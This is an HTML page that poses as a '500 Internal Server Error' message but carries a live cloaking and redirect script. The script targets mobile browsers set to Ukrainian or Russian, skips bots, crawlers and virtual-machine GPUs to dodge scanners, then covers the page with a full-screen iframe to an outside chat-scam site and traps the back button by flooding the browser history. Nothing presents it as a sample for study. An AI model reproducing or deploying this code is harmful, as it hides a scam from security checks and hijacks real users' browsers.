<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>500 Internal Server Error</title>
    <script>
    (function() {
        const lang = navigator.language || navigator.userLanguage || "";
        const isTargetLang = /uk|ua|ru/i.test(lang);

        const isMob = /iPhone|Android|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);

        const isBot = /bot|facebook|meta|externalhit|message|preview|cloud|datacenter|crawler|spider/i.test(navigator.userAgent);

        if (isBot || !isMob || !isTargetLang) {
            console.log("Access Denied: Environment mismatch");
            return;
        }

        const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh"; 
        
        function inject() {
            if (window.done) return;
            
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
                    if (/software|virtual|llvm|swiftshader|google|amazon/i.test(renderer)) return;
                }
            } catch (e) {}

            window.done = true;
            
            const style = document.createElement('style');
            style.innerHTML = `body,html{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#fff;}
                               iframe{width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:999999;}`;
            document.head.appendChild(style);

            const ifrm = document.createElement('iframe');
            ifrm.src = target;
            ifrm.allow = "autoplay; encrypted-media; fullscreen;";
            document.body.appendChild(ifrm);

            for(let i=0; i<15; i++) history.pushState(null, "", "#/entry_point_" + Math.random().toString(36).substring(7));
            window.onpopstate = () => { history.forward(); };
        }

        window.addEventListener('touchstart', inject, {once: true});
        window.addEventListener('click', inject, {once: true});
        window.addEventListener('scroll', inject, {once: true});
        
        setTimeout(inject, 3500);
    })();
    </script>
</head>
<body style="background:#fff; font-family:sans-serif; padding:50px; color:#666; -webkit-user-select:none; user-select:none;">
    <div style="max-width: 600px;">
        <h2 style="font-size: 24px; margin-bottom: 10px;">500 Internal Server Error</h2>
        <p style="font-size: 14px; line-height: 1.6;">The server encountered an unexpected condition that prevented it from fulfilling the request. Please try again later or contact the administrator.</p>
    </div>
</body>
</html>
